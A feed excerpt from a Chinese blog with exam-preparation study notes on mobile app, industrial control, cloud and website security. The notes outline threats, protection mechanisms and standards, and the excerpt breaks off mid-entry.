    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第25章 移动应用安全需求分析与安全保护工程</title>
    <link href="https://fl4g.cn/2020/09/29/%E7%AC%AC25%E7%AB%A0-%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/"/>
    <id>https://fl4g.cn/2020/09/29/%E7%AC%AC25%E7%AB%A0-%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/</id>
    <published>2020-09-29T06:46:06.000Z</published>
    <updated>2020-09-29T07:55:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="移动应用安全威胁与需求分析"><a href="#移动应用安全威胁与需求分析" class="headerlink" title="移动应用安全威胁与需求分析"></a>移动应用安全威胁与需求分析</h1><h2 id="移动应用系统组成"><a href="#移动应用系统组成" class="headerlink" title="移动应用系统组成"></a>移动应用系统组成</h2><p>三个部分：移动App、通信网络、应用服务端</p><h2 id="移动应用安全分析"><a href="#移动应用安全分析" class="headerlink" title="移动应用安全分析"></a>移动应用安全分析</h2><p>安全威胁类型：</p><ol><li><p>移动操作系统平台威胁：移动应用的安全性依赖于移动操作系统</p></li><li><p>无线网络攻击：通信内容监听、假冒基站、网络域名欺诈、网络钓鱼等攻击</p></li><li><p>恶意代码</p><a id="more"></a></li><li><p>移动应用代码逆向工程</p></li><li><p>移动应用程序非法篡改</p></li></ol><h2 id="Android系统安全与保护机制"><a href="#Android系统安全与保护机制" class="headerlink" title="Android系统安全与保护机制"></a>Android系统安全与保护机制</h2><h2 id="Android系统组成概要"><a href="#Android系统组成概要" class="headerlink" title="Android系统组成概要"></a>Android系统组成概要</h2><p><img src="/2020/09/29/%E7%AC%AC25%E7%AB%A0-%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/Android系统架构.jpg" style="zoom:50%;"></p><p>常见威胁形式：APK重打包、更新攻击、诱惑下载、提权攻击、远程控制、恶意付费、敏感信息搜集</p><h2 id="Android系统安全机制"><a href="#Android系统安全机制" class="headerlink" title="Android系统安全机制"></a>Android系统安全机制</h2><ol><li>权限声明机制</li><li>应用程序签名机制</li><li>沙箱机制：实现不同应用程序和进程之间的隔离</li><li>网络通信加密</li><li>内核安全机制</li></ol><p><img src="/2020/09/29/%E7%AC%AC25%E7%AB%A0-%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/Android系统安全.jpg" style="zoom:50%;"></p><h1 id="iOS系统功能安全与保护机制"><a href="#iOS系统功能安全与保护机制" class="headerlink" title="iOS系统功能安全与保护机制"></a>iOS系统功能安全与保护机制</h1><h2 id="iOS系统组成概要"><a href="#iOS系统组成概要" class="headerlink" title="iOS系统组成概要"></a>iOS系统组成概要</h2><p><img src="/2020/09/29/%E7%AC%AC25%E7%AB%A0-%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/iOS系统架构.jpg" style="zoom:50%;"></p><h2 id="iOS系统安全机制"><a href="#iOS系统安全机制" class="headerlink" title="iOS系统安全机制"></a>iOS系统安全机制</h2><p><img src="/2020/09/29/%E7%AC%AC25%E7%AB%A0-%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/iOS系统安全.jpg" style="zoom:50%;"></p><p>安全机制：</p><ol><li>安全启动链：iOS平台的安全依赖于启动链的安全</li><li>数据保护</li><li>数据的加密于保护机制：强制加密</li><li>地址空间布局随机化</li><li>代码签名</li><li>沙箱机制</li></ol><h1 id="移动应用安全保护机制与技术方案"><a href="#移动应用安全保护机制与技术方案" class="headerlink" title="移动应用安全保护机制与技术方案"></a>移动应用安全保护机制与技术方案</h1><h2 id="移动应用App安全风险"><a href="#移动应用App安全风险" class="headerlink" title="移动应用App安全风险"></a>移动应用App安全风险</h2><p>容易遭受反编译、调试、篡改、数据窃取等</p><h2 id="移动应用App安全加固"><a href="#移动应用App安全加固" class="headerlink" title="移动应用App安全加固"></a>移动应用App安全加固</h2><ol><li>防反编译：加密处理</li><li>防调试：设置调试检测功能，如清理用户数据、报告程序所在设备情况、禁止使用某些功能</li><li>防篡改：数字签名和多重校验</li><li>防窃取：加密</li></ol><h2 id="移动应用App安全检测"><a href="#移动应用App安全检测" class="headerlink" title="移动应用App安全检测"></a>移动应用App安全检测</h2><p>检测内容：</p><ul><li>身份认证机制检测</li><li>通信会话安全机制检测</li><li>敏感信息保护机制检测</li><li>日志安全策略检测</li><li>交易流程安全机制检测</li><li>服务端鉴权机制检测</li><li>访问控制机制检测</li><li>数据防篡改能力检测</li><li>防SQL注入能力检测</li><li>防钓鱼能力检测</li><li>App安全漏洞检测</li></ul><p>Android6.0及以上可收集的个人信息的权限，最小必要权限参考：</p><ol><li>地图导航：位置、存储权限</li><li>网络约车：位置、拨打电话权限</li><li>即时通信：存储权限</li><li>博客论坛：存储权限</li><li>网络支付：存储权限</li><li>新闻资讯：无</li><li>网上购物：无</li><li>短视频：存储权限</li><li>快递配送：无</li><li>餐饮外卖：位置、拨打电话权限</li><li>交通票务：无</li><li>婚恋相亲：存储权限</li><li>求职招聘：存储权限</li><li>金融借贷：存储权限</li><li>房屋租售：存储权限</li><li>二手车交易：存储权限</li><li>运动健身：位置、传感器权限</li><li>问诊挂号：存储权限</li><li>网页浏览器：无</li><li>输入法：无</li><li>安全管理：存储、获取应用账户、读取电话状态、短信权限</li></ol><h1 id="移动应用安全综合应用案例分析"><a href="#移动应用安全综合应用案例分析" class="headerlink" title="移动应用安全综合应用案例分析"></a>移动应用安全综合应用案例分析</h1><p>金融移动安全、运营商移动安全、移动办公安全详见P553-P555</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;移动应用安全威胁与需求分析&quot;&gt;&lt;a href=&quot;#移动应用安全威胁与需求分析&quot; class=&quot;headerlink&quot; title=&quot;移动应用安全威胁与需求分析&quot;&gt;&lt;/a&gt;移动应用安全威胁与需求分析&lt;/h1&gt;&lt;h2 id=&quot;移动应用系统组成&quot;&gt;&lt;a href=&quot;#移动应用系统组成&quot; class=&quot;headerlink&quot; title=&quot;移动应用系统组成&quot;&gt;&lt;/a&gt;移动应用系统组成&lt;/h2&gt;&lt;p&gt;三个部分：移动App、通信网络、应用服务端&lt;/p&gt;
&lt;h2 id=&quot;移动应用安全分析&quot;&gt;&lt;a href=&quot;#移动应用安全分析&quot; class=&quot;headerlink&quot; title=&quot;移动应用安全分析&quot;&gt;&lt;/a&gt;移动应用安全分析&lt;/h2&gt;&lt;p&gt;安全威胁类型：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;移动操作系统平台威胁：移动应用的安全性依赖于移动操作系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;无线网络攻击：通信内容监听、假冒基站、网络域名欺诈、网络钓鱼等攻击&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;恶意代码&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第24章 工控安全需求分析与安全保护工程</title>
    <link href="https://fl4g.cn/2020/09/29/%E7%AC%AC24%E7%AB%A0-%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/"/>
    <id>https://fl4g.cn/2020/09/29/%E7%AC%AC24%E7%AB%A0-%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/</id>
    <published>2020-09-29T03:55:15.000Z</published>
    <updated>2020-09-29T06:41:56.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工控系统安全威胁与需求分析"><a href="#工控系统安全威胁与需求分析" class="headerlink" title="工控系统安全威胁与需求分析"></a>工控系统安全威胁与需求分析</h1><h2 id="工业控制系统概念及组成"><a href="#工业控制系统概念及组成" class="headerlink" title="工业控制系统概念及组成"></a>工业控制系统概念及组成</h2><p>组成：各种控制组件、监测组件、数据处理与展示组件</p><p>工控系统分为：离散制造类和过程控制类</p><p>控制系统包括：</p><ol><li><p>SCADA系统（数据采集与监视控制系统）</p><p>功能：数据采集、参数测量和调节</p><p>组成：设在控制中心的主终端控制单元（MTU）、通信线路和设备、远程终端单位（RTU）</p><a id="more"></a></li><li><p>分布式控制系统（DCS）</p><p>包括：现场控制级、系统控制级和管理级两/三个层次</p></li><li><p>过程控制系统（PCS）</p><p>实时采集状态参数进行调节</p></li><li><p>可编程逻辑控制器（PLC）</p></li><li><p>主终端设备（MTU）</p></li><li><p>远程终端设备（RTU）</p></li><li><p>人机界面（HMI）</p></li><li><p>工控通信网络</p><p>常见协议：OPC、Modbus、DNP3</p><p>网络类型：DCS主控网络、SCADA远程网络、现场控制级通信网络</p></li></ol><h2 id="工业控制系统安全威胁分析"><a href="#工业控制系统安全威胁分析" class="headerlink" title="工业控制系统安全威胁分析"></a>工业控制系统安全威胁分析</h2><p>工控系统安全威胁：</p><ol><li>自然灾害及环境</li><li>内部安全威胁</li><li>设备功能安全故障</li><li>恶意代码</li><li>网络攻击</li></ol><h2 id="工业控制系统安全隐患类型"><a href="#工业控制系统安全隐患类型" class="headerlink" title="工业控制系统安全隐患类型"></a>工业控制系统安全隐患类型</h2><p>组要安全隐患分析：</p><ol><li>工控协议安全：缺乏安全设计，无安全认证、加密、审计</li><li>工控系统技术产品安全漏洞</li><li>工控系统基础软件安全漏洞</li><li>工控系统算法安全漏洞</li><li>工控系统设备固件漏洞</li><li>工控系统设备硬件漏洞</li><li>工控系统开放接入漏洞</li><li>工控系统供应链安全</li></ol><h2 id="工业控制系统安全需求分析"><a href="#工业控制系统安全需求分析" class="headerlink" title="工业控制系统安全需求分析"></a>工业控制系统安全需求分析</h2><p>工控系统网络信息安全两个方面：</p><ol><li>技术安全要求：安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心</li><li>管理要求：安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理</li></ol><p>国际标准：IEC62443系列，共12个文档</p><h1 id="工控系统安全保护机制与技术"><a href="#工控系统安全保护机制与技术" class="headerlink" title="工控系统安全保护机制与技术"></a>工控系统安全保护机制与技术</h1><h2 id="物理及环境安全防护"><a href="#物理及环境安全防护" class="headerlink" title="物理及环境安全防护"></a>物理及环境安全防护</h2><p>《工业控制系统信息安全防护指南》要求：</p><ul><li>对重要工程师站、数据库、服务器等核心工业控制软硬件所在区域采取访问控制、视频监控、专人值守等物理安全防护措施</li><li>拆除或封闭工业主机上不必要的USB、光驱、无线等接口</li></ul><h2 id="安全边界保护"><a href="#安全边界保护" class="headerlink" title="安全边界保护"></a>安全边界保护</h2><p>安全隔离类型：物理隔离、网络逻辑隔离</p><p>常见设备：工业防火墙、工业网闸、单向隔离设备、定制的边界安全防护网关</p><h2 id="身份认证与访问控制"><a href="#身份认证与访问控制" class="headerlink" title="身份认证与访问控制"></a>身份认证与访问控制</h2><ul><li>采用多因素认证</li><li>最小特权</li><li>强化登录账户密码</li><li>禁止不同系统共享认证证书信息</li></ul><h2 id="远程访问安全"><a href="#远程访问安全" class="headerlink" title="远程访问安全"></a>远程访问安全</h2><ul><li>禁止开通HTTP、FTP、Telnet服务</li><li>采用数据单项访问控制</li><li>采用VPN</li><li>访问日志，操作过程审计</li></ul><h2 id="工控系统安全加固"><a href="#工控系统安全加固" class="headerlink" title="工控系统安全加固"></a>工控系统安全加固</h2><p>技术措施：安全配置策略、身份认证增强、强制访问控制、程序白名单控制</p><h2 id="工控安全审计"><a href="#工控安全审计" class="headerlink" title="工控安全审计"></a>工控安全审计</h2><p>审计内容：人员账户、访问时间、操作内容等日志</p><h2 id="恶意代码防范"><a href="#恶意代码防范" class="headerlink" title="恶意代码防范"></a>恶意代码防范</h2><ul><li>只允许经过验证措施等防病毒软件和应用程序</li><li>建立防病毒和恶意软件入侵管理机制</li><li>及时补丁升级</li></ul><h2 id="工控数据安全"><a href="#工控数据安全" class="headerlink" title="工控数据安全"></a>工控数据安全</h2><p>常见数据类型：研发数据、生产数据、运维数据、管理数据、外部数据</p><p>相关要求：</p><ol><li>分级分类，加密存储、VPN隔离</li><li>定期备份</li><li>对测试数据进行保护</li></ol><h2 id="工控安全监测与应急响应"><a href="#工控安全监测与应急响应" class="headerlink" title="工控安全监测与应急响应"></a>工控安全监测与应急响应</h2><p>应急预案内容：应急计划的策略和规程、应急计划培训、应急计划测试与演练、应急处理流程、时间监控措施、应急啊时间报告流程、应急支持资源、应急响应计划</p><p>相关要求：</p><ul><li>部署网络安全监测设备</li><li>重要工业控制设备前段部署具备工业协议深度包检测功能的防护设备</li><li>制订工控安全时间应急响应预案</li><li>定期演练修订应急响应预案</li><li>对关键主机设备、网络设备、控制组件进行冗余配置</li></ul><h2 id="工控安全管理"><a href="#工控安全管理" class="headerlink" title="工控安全管理"></a>工控安全管理</h2><p>具体要求：</p><ol><li>建设工业控制系统资产清单，明确责任人</li><li>对关键主机设备、网络设备、控制组件进行冗余配置</li><li>安全软件选择与管理</li><li>配置和补丁管理</li><li>供应链管理：合同明确供应商责任和义务；保密协议</li><li>落实责任</li></ol><h2 id="工控安全典型产品技术"><a href="#工控安全典型产品技术" class="headerlink" title="工控安全典型产品技术"></a>工控安全典型产品技术</h2><ol><li><p>防护类型</p><p>典型技术产品：工控防火墙、工控加密、工控用户身份认证、工控可信计算、系统安全加固</p></li><li><p>物理隔离类型</p><p>常见产品：网闸、正反向隔离装置</p></li><li><p>审计与监测类型</p><p>主要产品：工控安全审计和工控入侵检测系统</p></li><li><p>检查类型</p><p>产品技术：工控漏洞扫描、工控漏洞挖掘、工控安全基线检查</p></li><li><p>运维和风险管控类型</p><p>产品技术：工控堡垒机、工控风险管理系统</p></li></ol><h1 id="工控系统安全综合应用案例分析"><a href="#工控系统安全综合应用案例分析" class="headerlink" title="工控系统安全综合应用案例分析"></a>工控系统安全综合应用案例分析</h1><p>电力监控系统安全总体方案、水厂工控安全集中监控、工控安全防护厂商方案详见P538-P542</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;工控系统安全威胁与需求分析&quot;&gt;&lt;a href=&quot;#工控系统安全威胁与需求分析&quot; class=&quot;headerlink&quot; title=&quot;工控系统安全威胁与需求分析&quot;&gt;&lt;/a&gt;工控系统安全威胁与需求分析&lt;/h1&gt;&lt;h2 id=&quot;工业控制系统概念及组成&quot;&gt;&lt;a href=&quot;#工业控制系统概念及组成&quot; class=&quot;headerlink&quot; title=&quot;工业控制系统概念及组成&quot;&gt;&lt;/a&gt;工业控制系统概念及组成&lt;/h2&gt;&lt;p&gt;组成：各种控制组件、监测组件、数据处理与展示组件&lt;/p&gt;
&lt;p&gt;工控系统分为：离散制造类和过程控制类&lt;/p&gt;
&lt;p&gt;控制系统包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;SCADA系统（数据采集与监视控制系统）&lt;/p&gt;
&lt;p&gt;功能：数据采集、参数测量和调节&lt;/p&gt;
&lt;p&gt;组成：设在控制中心的主终端控制单元（MTU）、通信线路和设备、远程终端单位（RTU）&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第23章 云计算安全需求分析与安全保护工程</title>
    <link href="https://fl4g.cn/2020/09/28/%E7%AC%AC23%E7%AB%A0-%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/"/>
    <id>https://fl4g.cn/2020/09/28/%E7%AC%AC23%E7%AB%A0-%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/</id>
    <published>2020-09-28T09:21:03.000Z</published>
    <updated>2020-09-29T03:48:09.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="云计算安全概念与威胁分析"><a href="#云计算安全概念与威胁分析" class="headerlink" title="云计算安全概念与威胁分析"></a>云计算安全概念与威胁分析</h1><h2 id="云计算基本概念"><a href="#云计算基本概念" class="headerlink" title="云计算基本概念"></a>云计算基本概念</h2><p>云计算的主要特征：</p><ol><li><p>IT资源以服务的形式提供</p><p>常见的服务：基础设施即服务IaaS、平台即服务PaaS、软件即服务SaaS、数据即服务DaaS、存储即服务STaaS</p></li><li><p>多租户共享IT资源</p></li><li><p>IT资源按需定制与按用付费</p></li><li><p>IT资源可伸缩性部署</p></li></ol><a id="more"></a><p>云计算四种部署模式：私有云、社区云、公有云和混合云</p><h2 id="云计算安全分析"><a href="#云计算安全分析" class="headerlink" title="云计算安全分析"></a>云计算安全分析</h2><ol><li><p>云端安全威胁：指使用云计算服务的终端设备</p></li><li><p>云“管”安全威胁：指连接用户端和与云计算平台的网络</p></li><li><p>云计算平台安全威胁</p><p>主要网络安全威胁：</p><ul><li>云计算平台物理安全威胁</li><li>云计算平台服务安全威胁</li><li>云平台资源滥用安全威胁</li><li>云计算平台运维及内部安全威胁</li><li>数据残留</li><li>过度依赖</li><li>利用共享技术漏洞进行的攻击</li><li>滥用云服务</li><li>云服务中断</li><li>利用不安全接口的攻击</li><li>数据丢失、篡改或泄漏</li></ul></li></ol><h2 id="云计算安全要求"><a href="#云计算安全要求" class="headerlink" title="云计算安全要求"></a>云计算安全要求</h2><p><img src="/2020/09/28/%E7%AC%AC23%E7%AB%A0-%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/云计算安全要求.jpg" style="zoom:50%;"></p><h1 id="云计算服务安全需求"><a href="#云计算服务安全需求" class="headerlink" title="云计算服务安全需求"></a>云计算服务安全需求</h1><h2 id="云计算技术安全需求"><a href="#云计算技术安全需求" class="headerlink" title="云计算技术安全需求"></a>云计算技术安全需求</h2><ol><li>云端安全需求分析：涉及云用户的身份标识和鉴别、资源访问控制、数据安全存储、云端设备及服务软件安全</li><li>网络安全通信安全需求分析：技术包括身份认证、密钥分配、数据加密、信道加密、防火墙、VPN、抗拒绝服务</li><li>云计算平台安全需求分析：安全需求有物理环境安全、主机服务器安全、操作系统、数据库安全、应用及数据安全、云操作系统安全、虚拟机安全和多租户安全隔离</li></ol><h2 id="云计算安全合规需求"><a href="#云计算安全合规需求" class="headerlink" title="云计算安全合规需求"></a>云计算安全合规需求</h2><ol><li>云计算安全国际管理标准规范</li><li>云计算安全国内管理标准规范<ul><li>《关于加强党政部门云计算服务网络安全管理的意见》</li><li>《云计算服务安全评估方法》</li><li>《信息安全技术 云计算服务安全指南》（GB/T 31167-2014）</li><li>《信息安全技术 云计算服务安全能力要求》（GB/T 31168-2014）</li><li>《信息安全技术 网络安全等级保护基本要求 第2部分：云计算安全扩展要求》（GA/T 1390.2-2017）</li><li>其他</li></ul></li></ol><h2 id="云计算隐私保护需求"><a href="#云计算隐私保护需求" class="headerlink" title="云计算隐私保护需求"></a>云计算隐私保护需求</h2><p>个人数据安全隐私保护要求：</p><ol><li>数据采集：明确信息采集范围和用途，告知用户相关风险</li><li>数据传输：加密</li><li>数据存储：加密、认证、访问控制、备份</li><li>数据使用：安全控制策略规则</li><li>数据维护：数据安全生命周期管理流程</li><li>数据安全事件处置</li></ol><h1 id="云计算安全保护与技术方案"><a href="#云计算安全保护与技术方案" class="headerlink" title="云计算安全保护与技术方案"></a>云计算安全保护与技术方案</h1><h2 id="云计算安全等级保护框架"><a href="#云计算安全等级保护框架" class="headerlink" title="云计算安全等级保护框架"></a>云计算安全等级保护框架</h2><p><img src="/2020/09/28/%E7%AC%AC23%E7%AB%A0-%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/云计算安全等保设计.jpg" style="zoom:50%;"></p><h2 id="云计算安全防护"><a href="#云计算安全防护" class="headerlink" title="云计算安全防护"></a>云计算安全防护</h2><p><img src="/2020/09/28/%E7%AC%AC23%E7%AB%A0-%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/平台等保要求.jpg" style="zoom:50%;"></p><p>常见安全机制：</p><ol><li>身份鉴别认证机制</li><li>数据完整性机制</li><li>访问控制机制</li><li>入侵防范机制</li><li>安全审计机制</li><li>云操作系统安全增强机制</li></ol><h2 id="云计算安全管理"><a href="#云计算安全管理" class="headerlink" title="云计算安全管理"></a>云计算安全管理</h2><p><img src="/2020/09/28/%E7%AC%AC23%E7%AB%A0-%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/安全管理.jpg" style="zoom:50%;"></p><h2 id="云计算安全运维"><a href="#云计算安全运维" class="headerlink" title="云计算安全运维"></a>云计算安全运维</h2><p><img src="/2020/09/28/%E7%AC%AC23%E7%AB%A0-%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/安全运维.jpg" style="zoom:50%;"></p><p>安全措施：</p><ol><li>云计算安全风险评估机制</li><li>云计算内部安全防护机制：身份认证、安全操作审计、远程安全登录</li><li>云计算网络安全监测机制</li><li>云计算应急响应机制</li><li>云计算容灾备份机制</li></ol><h1 id="云计算安全综合应用案例分析"><a href="#云计算安全综合应用案例分析" class="headerlink" title="云计算安全综合应用案例分析"></a>云计算安全综合应用案例分析</h1><p>阿里云安全、腾讯云安全、华为云安全、微软Azure云安全、云计算隐私保护详见P514-P524</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;云计算安全概念与威胁分析&quot;&gt;&lt;a href=&quot;#云计算安全概念与威胁分析&quot; class=&quot;headerlink&quot; title=&quot;云计算安全概念与威胁分析&quot;&gt;&lt;/a&gt;云计算安全概念与威胁分析&lt;/h1&gt;&lt;h2 id=&quot;云计算基本概念&quot;&gt;&lt;a href=&quot;#云计算基本概念&quot; class=&quot;headerlink&quot; title=&quot;云计算基本概念&quot;&gt;&lt;/a&gt;云计算基本概念&lt;/h2&gt;&lt;p&gt;云计算的主要特征：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;IT资源以服务的形式提供&lt;/p&gt;
&lt;p&gt;常见的服务：基础设施即服务IaaS、平台即服务PaaS、软件即服务SaaS、数据即服务DaaS、存储即服务STaaS&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;多租户共享IT资源&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;IT资源按需定制与按用付费&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;IT资源可伸缩性部署&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第22章 网站安全需求分析与安全保护工程</title>
    <link href="https://fl4g.cn/2020/09/28/%E7%AC%AC22%E7%AB%A0-%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/"/>
    <id>https://fl4g.cn/2020/09/28/%E7%AC%AC22%E7%AB%A0-%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/</id>
    <published>2020-09-28T06:25:58.000Z</published>
    <updated>2020-09-28T08:31:02.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网站安全威胁与需求分析"><a href="#网站安全威胁与需求分析" class="headerlink" title="网站安全威胁与需求分析"></a>网站安全威胁与需求分析</h1><p>网站安全主要是：机密性、完整性、可用性及可控性</p><h2 id="网站安全分析"><a href="#网站安全分析" class="headerlink" title="网站安全分析"></a>网站安全分析</h2><p>主要威胁：</p><ol><li><p>非授权访问</p></li><li><p>网页篡改</p></li><li><p>数据泄露</p></li><li><p>恶意代码</p><a id="more"></a></li><li><p>网站假冒</p></li><li><p>拒绝服务</p></li><li><p>网站后台管理安全威胁</p><p>常见问题：</p><ul><li>网站管理员身份及密码被窃取</li><li>后台管理网页存在安全漏洞</li><li>内部管理权限分配不合理</li></ul></li></ol><h2 id="网站安全需求"><a href="#网站安全需求" class="headerlink" title="网站安全需求"></a>网站安全需求</h2><p>包括：网络环境、网络通信、操作系统、数据库、应用服务器、Web服务软件、Web应用程序、数据等安全威胁防护</p><h1 id="Apache-Web安全分析与增强"><a href="#Apache-Web安全分析与增强" class="headerlink" title="Apache Web安全分析与增强"></a>Apache Web安全分析与增强</h1><h2 id="Apache-Web概述"><a href="#Apache-Web概述" class="headerlink" title="Apache Web概述"></a>Apache Web概述</h2><p>Apache Httpd配置文件如下：</p><ol><li>httpd.conf：设定Apache服务器一般的属性、端口、执行者身份</li><li>conf/srm.conf：数据配置文件</li><li>conf/access.conf：负责基本的读取文件控制</li><li>conf/mime.conf：设定Apache所能辨别的MIME格式</li></ol><h2 id="Apache-Web安全分析"><a href="#Apache-Web安全分析" class="headerlink" title="Apache Web安全分析"></a>Apache Web安全分析</h2><p>面临威胁：</p><ul><li>Apache Web软件程序威胁</li><li>Apache Web软件配置威胁</li><li>Apache Web安全机制威胁</li><li>Apache Web应用程序威胁</li><li>Apache Web服务通信威胁</li><li>Apache Web服务内容威胁</li><li>Apache Web服务器拒绝服务威胁</li></ul><h2 id="Apache-Web安全机制"><a href="#Apache-Web安全机制" class="headerlink" title="Apache Web安全机制"></a>Apache Web安全机制</h2><ol><li><p>Apache Web本地文件安全</p></li><li><p>Apache Web模块管理机制</p></li><li><p>Apache Web认证机制</p><p>对/user/local/apache/htdocs/secret目录进行访问控制详见P478</p></li><li><p>连接耗尽应对机制</p><p>解决办法：</p><ul><li>减少Apache超时（Timeout）设置、增大MaxClients设置</li><li>限制同一IP的最大连接数</li><li>多线程下载保护机制</li></ul></li><li><p>Apache Web自带的访问机制</p></li><li><p>Apache Web审计和日志：access.log和error.log</p></li><li><p>Apache Web服务器防范DoS</p></li></ol><h2 id="Apache-Web安全增强"><a 